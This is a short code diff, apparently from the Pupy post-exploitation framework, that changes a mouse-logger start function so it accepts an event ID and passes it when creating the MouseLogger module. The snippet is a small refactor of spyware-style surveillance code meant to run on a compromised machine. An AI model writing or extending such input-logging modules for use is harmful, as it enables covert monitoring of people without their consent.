@@ -25,12 +25,12 @@ import pupy
 
 current_window = None
 
-def mouselogger_start():
+def mouselogger_start(event_id=None):
     if pupy.manager.active(MouseLogger):
         return False
 
     try:
-        pupy.manager.create(MouseLogger)
+        pupy.manager.create(MouseLogger, event_id=event_id)
     except:
         return False
 
